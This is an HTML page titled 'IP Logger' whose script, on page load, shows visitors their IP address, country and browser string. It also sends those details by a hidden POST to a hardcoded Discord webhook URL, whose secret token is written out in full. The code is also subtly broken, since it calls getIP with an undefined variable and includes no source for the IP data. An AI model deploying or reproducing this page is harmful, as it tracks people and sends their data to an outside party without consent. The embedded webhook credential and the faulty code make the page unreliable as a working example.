<!DOCTYPE html>
<html>
<head>
    <title>IP Logger</title>
    <script type="text/javascript">
    function getIP(json) {
        document.getElementById("ip").innerHTML = json.ip;
        document.getElementById("country").innerHTML = json.country_name;
        document.getElementById("browser").innerHTML = navigator.userAgent;
        
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://discord.com/api/webhooks/1093641132673597562/9o1Nq18xZRKMiT4qUsjIx_l02CpaTdzU2Sd5K15kfRjcxieXek-uLdJtjeiOUhanC3r0");
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.send(JSON.stringify({content: "IP: "+json.ip+"\nCountry: "+json.country_name+"\nBrowser Info: "+navigator.userAgent}));
    }
    </script>
</head>
<body onload="getIP(json)">
    <h1>Welcome to the IP Logger!</h1>
    <p>Your IP address is: <span id="ip"></span></p>
    <p>Your country is: <span id="country"></span></p>
    <p>Your browser information is: <span id="browser"></span></p>
</body>
</html>
